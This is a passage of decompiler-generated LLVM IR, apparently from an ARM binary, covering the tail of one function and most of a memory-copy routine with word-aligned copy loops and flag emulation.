  br i1 %v9_11d98, label %dec_label_pc_11dcc, label %dec_label_pc_11da0

dec_label_pc_11da0:                               ; preds = %bb20
  %v2_11da0 = add i32 %v0_11d90, 24
  %v3_11da0 = inttoptr i32 %v2_11da0 to i32*
  store i32 %v2_11d94, i32* %v3_11da0, align 4
  %v0_11da4 = load i32, i32* @r4, align 4
  store i32 %v0_11da4, i32* %r0.global-to-local, align 4
  %v2_11da8 = call i32 @function_13524(i32 %v0_11da4)
  store i32 %v2_11da8, i32* %r0.global-to-local, align 4
  %v2_11dac = icmp eq i32 %v2_11da8, 0
  br i1 %v2_11dac, label %dec_label_pc_11de8, label %dec_label_pc_11db4

dec_label_pc_11db4:                               ; preds = %dec_label_pc_11da0
  %v0_11db4 = load i32, i32* @r4, align 4
  %v1_11db4 = add i32 %v0_11db4, 20
  %v2_11db4 = inttoptr i32 %v1_11db4 to i32*
  %v3_11db4 = load i32, i32* %v2_11db4, align 4
  %v2_11db8 = add i32 %v0_11db4, 24
  %v3_11db8 = inttoptr i32 %v2_11db8 to i32*
  store i32 %v3_11db4, i32* %v3_11db8, align 4
  %v0_11dbc = load i32, i32* @r4, align 4
  %v1_11dbc = add i32 %v0_11dbc, 16
  %v2_11dbc = inttoptr i32 %v1_11dbc to i32*
  %v3_11dbc = load i32, i32* %v2_11dbc, align 4
  %v1_11dc0 = inttoptr i32 %v3_11dbc to i8*
  %v2_11dc0 = load i8, i8* %v1_11dc0, align 1
  %v3_11dc0 = zext i8 %v2_11dc0 to i32
  store i32 %v3_11dc0, i32* %r0.global-to-local, align 4
  %v5_11dc0 = add i32 %v3_11dbc, 1
  store i32 %v5_11dc0, i32* %v2_11dbc, align 4
  br label %dec_label_pc_11dec

dec_label_pc_11dcc:                               ; preds = %bb20
  %v1_11dcc = inttoptr i32 %v0_11d90 to i8*
  store i32 %v0_11d90, i32* %r0.global-to-local, align 4
  %v2_11dd0 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_11dd0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_11dd8 = call i32 @function_133fc(i8* %v1_11dcc, i32 %v2_11dd0, i32 1)
  store i32 %v5_11dd8, i32* %r0.global-to-local, align 4
  %v2_11ddc = icmp eq i32 %v5_11dd8, 0
  br i1 %v2_11ddc, label %dec_label_pc_11de8, label %bb21

bb21:                                             ; preds = %dec_label_pc_11dcc
  %v4_11de0 = load i8, i8* %stack_var_-9, align 1
  %v5_11de0 = sext i8 %v4_11de0 to i32
  store i32 %v5_11de0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11dec

dec_label_pc_11de8:                               ; preds = %dec_label_pc_11dcc, %dec_label_pc_11cfc, %dec_label_pc_11da0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11dec

dec_label_pc_11dec:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_11db4, %dec_label_pc_11d7c, %dec_label_pc_11de8
  %v2_11df0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11df0, i32* @r4, align 4
  %v8_11df0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_11df0

; uselistorder directives
  uselistorder i32 %v2_11d4c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_11d0c, { 1, 0, 2 }
  uselistorder i32 %v2_11d58, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_11ccc, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 10, 0, 1, 4, 2, 3, 13, 5, 6, 7, 8, 9, 12, 11 }
  uselistorder i8** @global_var_1f1bc.264, { 2, 1, 0 }
  uselistorder i32** @global_var_1f184.318, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11dec, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_11de8, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_11d7c, { 1, 0 }
}

define i32 @function_11e00(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11e00:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_11e00 = load i32, i32* @r1, align 4
  %v1_11e00 = load i32, i32* %r0.global-to-local, align 4
  %v2_11e00 = sub i32 %v0_11e00, %v1_11e00
  %v3_11e00 = icmp ult i32 %v0_11e00, %v1_11e00
  %v4_11e00 = xor i32 %v1_11e00, %v0_11e00
  %v5_11e00 = xor i32 %v2_11e00, %v0_11e00
  %v6_11e00 = and i32 %v5_11e00, %v4_11e00
  %v7_11e00 = icmp slt i32 %v6_11e00, 0
  store i1 %v7_11e00, i1* %cpsr_v.global-to-local, align 1
  %v8_11e00 = icmp slt i32 %v2_11e00, 0
  store i1 %v8_11e00, i1* %cpsr_n.global-to-local, align 1
  %v9_11e00 = icmp eq i32 %v0_11e00, %v1_11e00
  store i1 %v9_11e00, i1* @cpsr_z, align 1
  br i1 %v3_11e00, label %dec_label_pc_1204c, label %dec_label_pc_11e08

dec_label_pc_11e08:                               ; preds = %dec_label_pc_11e00
  br i1 %v9_11e00, label %.thread123, label %bb

.thread123:                                       ; preds = %bb146, %.thread122, %bb143, %dec_label_pc_11e08
  %merge = phi i32 [ %v0_11e00, %dec_label_pc_11e08 ], [ %v2_120e0, %bb143 ], [ %v11_120fc, %bb146 ], [ %v7_120fc, %.thread122 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_11e08
  %v5_11e0c = inttoptr i32 %v1_11e00 to i8*
  store i8* %v5_11e0c, i8** %stack_var_-8, align 4
  %v0_11e10 = load i32, i32* @r2, align 4
  %v2_11e10 = add i32 %v0_11e10, -4
  store i32 %v2_11e10, i32* %r2.global-to-local, align 4
  %v4_11e10 = sub i32 3, %v0_11e10
  %v5_11e10 = and i32 %v4_11e10, %v0_11e10
  %v6_11e10 = icmp slt i32 %v5_11e10, 0
  store i1 %v6_11e10, i1* %cpsr_v.global-to-local, align 1
  %v7_11e10 = icmp slt i32 %v2_11e10, 0
  store i1 %v7_11e10, i1* %cpsr_n.global-to-local, align 1
  %v5_11e14 = icmp slt i32 %v0_11e10, 4
  br i1 %v5_11e14, label %bb133, label %dec_label_pc_11e18

dec_label_pc_11e18:                               ; preds = %bb
  %v1_11e18 = urem i32 %v1_11e00, 4
  store i32 %v1_11e18, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11e18 = icmp eq i32 %v1_11e18, 0
  br i1 %v2_11e18, label %dec_label_pc_11e20, label %dec_label_pc_11ec4

dec_label_pc_11e20:                               ; preds = %dec_label_pc_11e18
  %v1_11e20 = urem i32 %v0_11e00, 4
  store i32 %v1_11e20, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11e20 = icmp eq i32 %v1_11e20, 0
  %extract.t = trunc i32 %v0_11e00 to i2
  br i1 %v2_11e20, label %dec_label_pc_11e28, label %dec_label_pc_11ef4

dec_label_pc_11e28:                               ; preds = %dec_label_pc_11e20, %dec_label_pc_11eec
  %v0_11e4093 = phi i32 [ %v1_11e00, %dec_label_pc_11e20 ], [ %v0_11f3c76, %dec_label_pc_11eec ]
  %v0_11e3c92 = phi i32 [ %v0_11e00, %dec_label_pc_11e20 ], [ %v0_11eec, %dec_label_pc_11eec ]
  %v0_11e28 = phi i32 [ %v2_11e10, %dec_label_pc_11e20 ], [ %v2_11ee4, %dec_label_pc_11eec ]
  %v2_11e28 = add i32 %v0_11e28, -8
  store i32 %v2_11e28, i32* %r2.global-to-local, align 4
  %v4_11e28 = sub i32 7, %v0_11e28
  %v5_11e28 = and i32 %v4_11e28, %v0_11e28
  %v6_11e28 = icmp slt i32 %v5_11e28, 0
  store i1 %v6_11e28, i1* %cpsr_v.global-to-local, align 1
  %v7_11e28 = icmp slt i32 %v2_11e28, 0
  store i1 %v7_11e28, i1* %cpsr_n.global-to-local, align 1
  %v5_11e2c = icmp slt i32 %v0_11e28, 8
  br i1 %v5_11e2c, label %dec_label_pc_11e7c, label %dec_label_pc_11e30

dec_label_pc_11e30:                               ; preds = %dec_label_pc_11e28
  %v2_11e30 = add i32 %v0_11e28, -28
  store i32 %v2_11e30, i32* %r2.global-to-local, align 4
  %v4_11e30 = sub i32 27, %v0_11e28
  %v5_11e30 = and i32 %v4_11e30, %v2_11e28
  %v6_11e30 = icmp slt i32 %v5_11e30, 0
  store i1 %v6_11e30, i1* %cpsr_v.global-to-local, align 1
  %v7_11e30 = icmp slt i32 %v2_11e30, 0
  store i1 %v7_11e30, i1* %cpsr_n.global-to-local, align 1
  %v5_11e34 = icmp slt i32 %v2_11e28, 20
  br i1 %v5_11e34, label %dec_label_pc_11e68, label %dec_label_pc_11e38

dec_label_pc_11e38:                               ; preds = %dec_label_pc_11e30
  %v0_11e38 = load i32, i32* @r4, align 4
  store i32 %v0_11e38, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11e3c

dec_label_pc_11e3c:                               ; preds = %dec_label_pc_11e3c.dec_label_pc_11e3c_crit_edge, %dec_label_pc_11e38
  %v0_11e40 = phi i32 [ %v12_11e48, %dec_label_pc_11e3c.dec_label_pc_11e3c_crit_edge ], [ %v0_11e4093, %dec_label_pc_11e38 ]
  %v0_11e3c = phi i32 [ %v0_11e3c.pre, %dec_label_pc_11e3c.dec_label_pc_11e3c_crit_edge ], [ %v0_11e3c92, %dec_label_pc_11e38 ]
  %v1_11e3c = inttoptr i32 %v0_11e3c to i32*
  %v2_11e3c = load i32, i32* %v1_11e3c, align 4
  store i32 %v2_11e3c, i32* %r3.global-to-local, align 4
  %v3_11e3c = add i32 %v0_11e3c, 4
  %v4_11e3c = inttoptr i32 %v3_11e3c to i32*
  %v5_11e3c = load i32, i32* %v4_11e3c, align 4
  store i32 %v5_11e3c, i32* %r4.global-to-local, align 4
  %v6_11e3c = add i32 %v0_11e3c, 8
  %v7_11e3c = inttoptr i32 %v6_11e3c to i32*
  %v8_11e3c = load i32, i32* %v7_11e3c, align 4
  store i32 %v8_11e3c, i32* %ip.global-to-local, align 4
  %v9_11e3c = add i32 %v0_11e3c, 12
  %v10_11e3c = inttoptr i32 %v9_11e3c to i32*
  %v11_11e3c = load i32, i32* %v10_11e3c, align 4
  store i32 %v11_11e3c, i32* %lr.global-to-local, align 4
  %v12_11e3c = add i32 %v0_11e3c, 16
  store i32 %v12_11e3c, i32* %r1.global-to-local, align 4
  %v1_11e40 = inttoptr i32 %v0_11e40 to i32*
  store i32 %v2_11e3c, i32* %v1_11e40, align 4
  %v3_11e40 = add i32 %v0_11e40, 4
  %v4_11e40 = inttoptr i32 %v3_11e40 to i32*
  %v5_11e40 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_11e40, i32* %v4_11e40, align 4
  %v6_11e40 = add i32 %v0_11e40, 8
  %v7_11e40 = inttoptr i32 %v6_11e40 to i32*
  %v8_11e40 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_11e40, i32* %v7_11e40, align 4
  %v9_11e40 = add i32 %v0_11e40, 12
  %v10_11e40 = inttoptr i32 %v9_11e40 to i32*
  %v11_11e40 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_11e40, i32* %v10_11e40, align 4
  %v12_11e40 = add i32 %v0_11e40, 16
  store i32 %v12_11e40, i32* %r0.global-to-local, align 4
  %v0_11e44 = load i32, i32* %r1.global-to-local, align 4
  %v1_11e44 = inttoptr i32 %v0_11e44 to i32*
  %v2_11e44 = load i32, i32* %v1_11e44, align 4
  store i32 %v2_11e44, i32* %r3.global-to-local, align 4
  %v3_11e44 = add i32 %v0_11e44, 4
  %v4_11e44 = inttoptr i32 %v3_11e44 to i32*
  %v5_11e44 = load i32, i32* %v4_11e44, align 4
  store i32 %v5_11e44, i32* %r4.global-to-local, align 4
  %v6_11e44 = add i32 %v0_11e44, 8
  %v7_11e44 = inttoptr i32 %v6_11e44 to i32*
  %v8_11e44 = load i32, i32* %v7_11e44, align 4
  store i32 %v8_11e44, i32* @ip, align 4
  %v9_11e44 = add i32 %v0_11e44, 12
  %v10_11e44 = inttoptr i32 %v9_11e44 to i32*
  %v11_11e44 = load i32, i32* %v10_11e44, align 4
  store i32 %v11_11e44, i32* @lr, align 4
  %v12_11e44 = add i32 %v0_11e44, 16
  store i32 %v12_11e44, i32* @r1, align 4
  %v1_11e48 = inttoptr i32 %v12_11e40 to i32*
  store i32 %v2_11e44, i32* %v1_11e48, align 4
  %v3_11e48 = add i32 %v0_11e40, 20
  %v4_11e48 = inttoptr i32 %v3_11e48 to i32*
  %v5_11e48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_11e48, i32* %v4_11e48, align 4
  %v6_11e48 = add i32 %v0_11e40, 24
  %v7_11e48 = inttoptr i32 %v6_11e48 to i32*
  %v8_11e48 = load i32, i32* @ip, align 4
  store i32 %v8_11e48, i32* %v7_11e48, align 4
  %v9_11e48 = add i32 %v0_11e40, 28
  %v10_11e48 = inttoptr i32 %v9_11e48 to i32*
  %v11_11e48 = load i32, i32* @lr, align 4
  store i32 %v11_11e48, i32* %v10_11e48, align 4
  %v12_11e48 = add i32 %v0_11e40, 32
  store i32 %v12_11e48, i32* %r0.global-to-local, align 4
  %v0_11e4c = load i32, i32* %r2.global-to-local, align 4
  %v2_11e4c = add i32 %v0_11e4c, -32
  store i32 %v2_11e4c, i32* %r2.global-to-local, align 4
  %v6_11e50 = icmp slt i32 %v0_11e4c, 32
  br i1 %v6_11e50, label %dec_label_pc_11e54, label %dec_label_pc_11e3c.dec_label_pc_11e3c_crit_edge

dec_label_pc_11e3c.dec_label_pc_11e3c_crit_edge:  ; preds = %dec_label_pc_11e3c
  %v0_11e3c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_11e3c

dec_label_pc_11e54:                               ; preds = %dec_label_pc_11e3c
  %v4_11e54 = add i32 %v0_11e4c, -16
  %v6_11e54 = add i32 %v0_11e4c, 2147483616
  %v7_11e54 = and i32 %v4_11e54, %v6_11e54
  %v8_11e54 = icmp slt i32 %v7_11e54, 0
  store i1 %v8_11e54, i1* %cpsr_v.global-to-local, align 1
  %v9_11e54 = icmp slt i32 %v4_11e54, 0
  store i1 %v9_11e54, i1* %cpsr_n.global-to-local, align 1
  %v5_11e58 = icmp slt i32 %v2_11e4c, -16
  br i1 %v5_11e58, label %.thread2, label %bb130

bb130:                                            ; preds = %dec_label_pc_11e54
  %v6_11e58 = load i32, i32* @r1, align 4
  %v7_11e58 = inttoptr i32 %v6_11e58 to i32*
  %v8_11e58 = load i32, i32* %v7_11e58, align 4
  store i32 %v8_11e58, i32* %r3.global-to-local, align 4
  %v9_11e58 = add i32 %v6_11e58, 4
  %v10_11e58 = inttoptr i32 %v9_11e58 to i32*
  %v11_11e58 = load i32, i32* %v10_11e58, align 4
  store i32 %v11_11e58, i32* %r4.global-to-local, align 4
  %v12_11e58 = add i32 %v6_11e58, 8
  %v13_11e58 = inttoptr i32 %v12_11e58 to i32*
  %v14_11e58 = load i32, i32* %v13_11e58, align 4
  store i32 %v14_11e58, i32* @ip, align 4
  %v15_11e58 = add i32 %v6_11e58, 12
  %v16_11e58 = inttoptr i32 %v15_11e58 to i32*
  %v17_11e58 = load i32, i32* %v16_11e58, align 4
  store i32 %v17_11e58, i32* @lr, align 4
  %v18_11e58 = add i32 %v6_11e58, 16
  store i32 %v18_11e58, i32* @r1, align 4
  %v7_11e5c = inttoptr i32 %v12_11e48 to i32*
  store i32 %v8_11e58, i32* %v7_11e5c, align 4
  %v9_11e5c = add i32 %v0_11e40, 36
  %v10_11e5c = inttoptr i32 %v9_11e5c to i32*
  %v11_11e5c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_11e5c, i32* %v10_11e5c, align 4
  %v12_11e5c = add i32 %v0_11e40, 40
  %v13_11e5c = inttoptr i32 %v12_11e5c to i32*
  %v14_11e5c = load i32, i32* @ip, align 4
  store i32 %v14_11e5c, i32* %v13_11e5c, align 4
  %v15_11e5c = add i32 %v0_11e40, 44
  %v16_11e5c = inttoptr i32 %v15_11e5c to i32*
  %v17_11e5c = load i32, i32* @lr, align 4
  store i32 %v17_11e5c, i32* %v16_11e5c, align 4
  %v18_11e5c = add i32 %v0_11e40, 48
  store i32 %v18_11e5c, i32* %r0.global-to-local, align 4
  %v6_11e60 = load i32, i32* %r2.global-to-local, align 4
  %v7_11e60 = add i32 %v6_11e60, -16
  store i32 %v7_11e60, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11e54, %bb130
  %v3_11e70102 = phi i32 [ %v12_11e48, %dec_label_pc_11e54 ], [ %v18_11e5c, %bb130 ]
  %v0_11e6896 = phi i32 [ %v2_11e4c, %dec_label_pc_11e54 ], [ %v7_11e60, %bb130 ]
  %v2_11e64 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11e64, i32* @r4, align 4
  br label %dec_label_pc_11e68

dec_label_pc_11e68:                               ; preds = %dec_label_pc_11e30, %.thread2
  %v3_11e70101 = phi i32 [ %v0_11e4093, %dec_label_pc_11e30 ], [ %v3_11e70102, %.thread2 ]
  %v0_11e68 = phi i32 [ %v2_11e30, %dec_label_pc_11e30 ], [ %v0_11e6896, %.thread2 ]
  %v1_11e68 = add i32 %v0_11e68, 20
  store i32 %v1_11e68, i32* %r2.global-to-local, align 4
  %v3_11e68 = sub i32 0, %v0_11e68
  %v4_11e68 = and i32 %v1_11e68, %v3_11e68
  %v5_11e68 = icmp slt i32 %v4_11e68, 0
  store i1 %v5_11e68, i1* %cpsr_v.global-to-local, align 1
  %v6_11e68 = icmp slt i32 %v1_11e68, 0
  store i1 %v6_11e68, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_11e6c

dec_label_pc_11e6c:                               ; preds = %.thread118, %dec_label_pc_11e68
  %v0_11e7c.pre149 = phi i32 [ %v0_11e7c.pre, %.thread118 ], [ %v1_11e68, %dec_label_pc_11e68 ]
  %v3_11e70 = phi i32 [ %v3_11e7099119, %.thread118 ], [ %v3_11e70101, %dec_label_pc_11e68 ]
  %v1_11e74 = phi i1 [ %v1_11e78, %.thread118 ], [ %v5_11e68, %dec_label_pc_11e68 ]
  %v0_11e74 = phi i1 [ %v0_11e78, %.thread118 ], [ %v6_11e68, %dec_label_pc_11e68 ]
  %v2_11e6c = xor i1 %v1_11e74, %v0_11e74
  br i1 %v2_11e6c, label %.thread118, label %bb131

bb131:                                            ; preds = %dec_label_pc_11e6c
  %v3_11e6c = load i32, i32* @r1, align 4
  %v4_11e6c = inttoptr i32 %v3_11e6c to i32*
  %v5_11e6c = load i32, i32* %v4_11e6c, align 4
  store i32 %v5_11e6c, i32* %r3.global-to-local, align 4
  %v6_11e6c = add i32 %v3_11e6c, 4
  %v7_11e6c = inttoptr i32 %v6_11e6c to i32*
  %v8_11e6c = load i32, i32* %v7_11e6c, align 4
  store i32 %v8_11e6c, i32* @ip, align 4
  %v9_11e6c = add i32 %v3_11e6c, 8
  %v10_11e6c = inttoptr i32 %v9_11e6c to i32*
  %v11_11e6c = load i32, i32* %v10_11e6c, align 4
  store i32 %v11_11e6c, i32* @lr, align 4
  %v12_11e6c = add i32 %v3_11e6c, 12
  store i32 %v12_11e6c, i32* @r1, align 4
  %v4_11e70 = inttoptr i32 %v3_11e70 to i32*
  store i32 %v5_11e6c, i32* %v4_11e70, align 4
  %v6_11e70 = add i32 %v3_11e70, 4
  %v7_11e70 = inttoptr i32 %v6_11e70 to i32*
  %v8_11e70 = load i32, i32* @ip, align 4
  store i32 %v8_11e70, i32* %v7_11e70, align 4
  %v9_11e70 = add i32 %v3_11e70, 8
  %v10_11e70 = inttoptr i32 %v9_11e70 to i32*
  %v11_11e70 = load i32, i32* @lr, align 4
  store i32 %v11_11e70, i32* %v10_11e70, align 4
  %v12_11e70 = add i32 %v3_11e70, 12
  store i32 %v12_11e70, i32* %r0.global-to-local, align 4
  %v3_11e74 = load i32, i32* %r2.global-to-local, align 4
  %v4_11e74 = add i32 %v3_11e74, -12
  store i32 %v4_11e74, i32* %r2.global-to-local, align 4
  %v6_11e74 = sub i32 11, %v3_11e74
  %v7_11e74 = and i32 %v6_11e74, %v3_11e74
  %v8_11e74 = icmp slt i32 %v7_11e74, 0
  store i1 %v8_11e74, i1* %cpsr_v.global-to-local, align 1
  %v9_11e74 = icmp slt i32 %v4_11e74, 0
  store i1 %v9_11e74, i1* %cpsr_n.global-to-local, align 1
  br label %.thread118

.thread118:                                       ; preds = %dec_label_pc_11e6c, %bb131
  %v0_11e7c.pre = phi i32 [ %v4_11e74, %bb131 ], [ %v0_11e7c.pre149, %dec_label_pc_11e6c ]
  %v3_11e7099119 = phi i32 [ %v12_11e70, %bb131 ], [ %v3_11e70, %dec_label_pc_11e6c ]
  %v1_11e78 = phi i1 [ %v8_11e74, %bb131 ], [ %v1_11e74, %dec_label_pc_11e6c ]
  %v0_11e78 = phi i1 [ %v9_11e74, %bb131 ], [ %v0_11e74, %dec_label_pc_11e6c ]
  %v2_11e78 = xor i1 %v1_11e78, %v0_11e78
  br i1 %v2_11e78, label %dec_label_pc_11e7c, label %dec_label_pc_11e6c

dec_label_pc_11e7c:                               ; preds = %.thread118, %dec_label_pc_11e28
  %v7_11e8c = phi i32 [ %v0_11e4093, %dec_label_pc_11e28 ], [ %v3_11e7099119, %.thread118 ]
  %v0_11e7c = phi i32 [ %v2_11e28, %dec_label_pc_11e28 ], [ %v0_11e7c.pre, %.thread118 ]
  %v2_11e7c = add i32 %v0_11e7c, 8
  store i32 %v2_11e7c, i32* %r2.global-to-local, align 4
  %v4_11e7c = sub i32 0, %v0_11e7c
  %v5_11e7c = and i32 %v2_11e7c, %v4_11e7c
  %v6_11e7c = icmp slt i32 %v5_11e7c, 0
  store i1 %v6_11e7c, i1* %cpsr_v.global-to-local, align 1
  %v7_11e7c = icmp slt i32 %v2_11e7c, 0
  store i1 %v7_11e7c, i1* %cpsr_n.global-to-local, align 1
  %v5_11e80 = icmp slt i32 %v0_11e7c, -8
  br i1 %v5_11e80, label %bb133, label %dec_label_pc_11e84

dec_label_pc_11e84:                               ; preds = %dec_label_pc_11e7c
  %v6_11e84 = add i32 %v0_11e7c, 4
  store i32 %v6_11e84, i32* %r2.global-to-local, align 4
  %v8_11e84 = sub i32 -5, %v0_11e7c
  %v9_11e84 = and i32 %v8_11e84, %v2_11e7c
  %v10_11e84 = icmp slt i32 %v9_11e84, 0
  store i1 %v10_11e84, i1* %cpsr_v.global-to-local, align 1
  %v11_11e84 = icmp slt i32 %v6_11e84, 0
  store i1 %v11_11e84, i1* %cpsr_n.global-to-local, align 1
  %v5_11e88 = icmp slt i32 %v2_11e7c, 4
  %v6_11e88 = load i32, i32* @r1, align 4
  %v7_11e88 = inttoptr i32 %v6_11e88 to i32*
  %v8_11e88 = load i32, i32* %v7_11e88, align 4
  store i32 %v8_11e88, i32* %r3.global-to-local, align 4
  %v10_11e88 = add i32 %v6_11e88, 4
  br i1 %v5_11e88, label %.thread6, label %bb132

.thread6:                                         ; preds = %dec_label_pc_11e84
  store i32 %v10_11e88, i32* @r1, align 4
  %v8_11e8c = inttoptr i32 %v7_11e8c to i32*
  store i32 %v8_11e88, i32* %v8_11e8c, align 4
  %v9_11e8c = load i32, i32* %r0.global-to-local, align 4
  %v10_11e8c = add i32 %v9_11e8c, 4
  store i32 %v10_11e8c, i32* %r0.global-to-local, align 4
  %v0_11e9c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb133

bb132:                                            ; preds = %dec_label_pc_11e84
  %v10_11e90 = inttoptr i32 %v10_11e88 to i32*
  %v11_11e90 = load i32, i32* %v10_11e90, align 4
  store i32 %v11_11e90, i32* @ip, align 4
  %v12_11e90 = add i32 %v6_11e88, 8
  store i32 %v12_11e90, i32* @r1, align 4
  %v7_11e94 = inttoptr i32 %v7_11e8c to i32*
  store i32 %v8_11e88, i32* %v7_11e94, align 4
  %v9_11e94 = add i32 %v7_11e8c, 4
  %v10_11e94 = inttoptr i32 %v9_11e94 to i32*
  %v11_11e94 = load i32, i32* @ip, align 4
  store i32 %v11_11e94, i32* %v10_11e94, align 4
  %v12_11e94 = add i32 %v7_11e8c, 8
  store i32 %v12_11e94, i32* %r0.global-to-local, align 4
  %v6_11e98 = load i32, i32* %r2.global-to-local, align 4
  %v7_11e98 = add i32 %v6_11e98, -4
  store i32 %v7_11e98, i32* %r2.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %.thread6, %.thread12, %dec_label_pc_11e7c, %bb, %dec_label_pc_11fd8, %dec_label_pc_11f6c, %dec_label_pc_12044, %bb132
  %v2_11eac = phi i32 [ %v10_11e8c, %.thread6 ], [ %v0_11f3c76, %.thread12 ], [ %v7_11e8c, %dec_label_pc_11e7c ], [ %v1_11e00, %bb ], [ %v2_11eac114, %dec_label_pc_11fd8 ], [ %v2_11eac113, %dec_label_pc_11f6c ], [ %v2_11eac112, %dec_label_pc_12044 ], [ %v12_11e94, %bb132 ]
  %v0_11e9c = phi i32 [ %v0_11e9c.pre, %.thread6 ], [ %v2_11ee4, %.thread12 ], [ %v2_11e7c, %dec_label_pc_11e7c ], [ %v2_11e10, %bb ], [ %v0_11e9c110, %dec_label_pc_11fd8 ], [ %v0_11e9c109, %dec_label_pc_11f6c ], [ %v0_11e9c108, %dec_label_pc_12044 ], [ %v7_11e98, %bb132 ]
  %v1_11e9c = add i32 %v0_11e9c, 4
  store i32 %v1_11e9c, i32* @r2, align 4
  %v3_11e9c = sub i32 0, %v0_11e9c
  %v4_11e9c = and i32 %v1_11e9c, %v3_11e9c
  %v5_11e9c = icmp slt i32 %v4_11e9c, 0
  store i1 %v5_11e9c, i1* %cpsr_v.global-to-local, align 1
  %v6_11e9c = icmp slt i32 %v1_11e9c, 0
  store i1 %v6_11e9c, i1* %cpsr_n.global-to-local, align 1
  %v7_11e9c = icmp eq i32 %v1_11e9c, 0
  store i1 %v7_11e9c, i1* @cpsr_z, align 1
  br i1 %v7_11e9c, label %bb134, label %bb135

bb134:                                            ; preds = %bb133
  %v3_11ea0 = load i8*, i8** %stack_var_-8, align 4
  %v4_11ea0 = ptrtoint i8* %v3_11ea0 to i32
  store i32 %v4_11ea0, i32* %r0.global-to-local, align 4
  ret i32 %v4_11ea0

bb135:                                            ; preds = %bb133
  %v1_11ea4 = add i32 %v0_11e9c, 2
  %v3_11ea4 = sub i32 -3, %v0_11e9c
  %v4_11ea4 = and i32 %v3_11ea4, %v1_11e9c
  %v5_11ea4 = icmp slt i32 %v4_11ea4, 0
  store i1 %v5_11ea4, i1* %cpsr_v.global-to-local, align 1
  %v6_11ea4 = icmp slt i32 %v1_11ea4, 0
  store i1 %v6_11ea4, i1* %cpsr_n.global-to-local, align 1
  %v7_11ea4 = icmp eq i32 %v1_11e9c, 2
  store i1 %v7_11ea4, i1* @cpsr_z, align 1
  %v0_11ea8 = load i32, i32* @r1, align 4
  %v1_11ea8 = inttoptr i32 %v0_11ea8 to i8*
  %v2_11ea8 = load i8, i8* %v1_11ea8, align 1
  %v3_11ea8 = zext i8 %v2_11ea8 to i32
  store i32 %v3_11ea8, i32* %r3.global-to-local, align 4
  %v5_11ea8 = add i32 %v0_11ea8, 1
  store i32 %v5_11ea8, i32* @r1, align 4
  %v3_11eac = inttoptr i32 %v2_11eac to i8*
  store i8 %v2_11ea8, i8* %v3_11eac, align 1
  %v4_11eac = load i32, i32* %r0.global-to-local, align 4
  %v5_11eac = add i32 %v4_11eac, 1
  store i32 %v5_11eac, i32* %r0.global-to-local, align 4
  %v0_11eb0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_11eb0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_11eb0 = xor i1 %v0_11eb0, %v1_11eb0
  br i1 %v2_11eb0, label %.thread120, label %bb136

bb136:                                            ; preds = %bb135
  %v3_11eb0 = load i32, i32* @r1, align 4
  %v4_11eb0 = inttoptr i32 %v3_11eb0 to i8*
  %v5_11eb0 = load i8, i8* %v4_11eb0, align 1
  %v6_11eb0 = zext i8 %v5_11eb0 to i32
  store i32 %v6_11eb0, i32* %r3.global-to-local, align 4
  %v8_11eb0 = add i32 %v3_11eb0, 1
  store i32 %v8_11eb0, i32* @r1, align 4
  %v6_11eb4 = inttoptr i32 %v5_11eac to i8*
  store i8 %v5_11eb0, i8* %v6_11eb4, align 1
  %v7_11eb4 = load i32, i32* %r0.global-to-local, align 4
  %v8_11eb4 = add i32 %v7_11eb4, 1
  store i32 %v8_11eb4, i32* %r0.global-to-local, align 4
  %v1_11eb8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_11eb8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread120

.thread120:                                       ; preds = %bb135, %bb136
  %v7_11ebc = phi i32 [ %v8_11eb4, %bb136 ], [ %v5_11eac, %bb135 ]
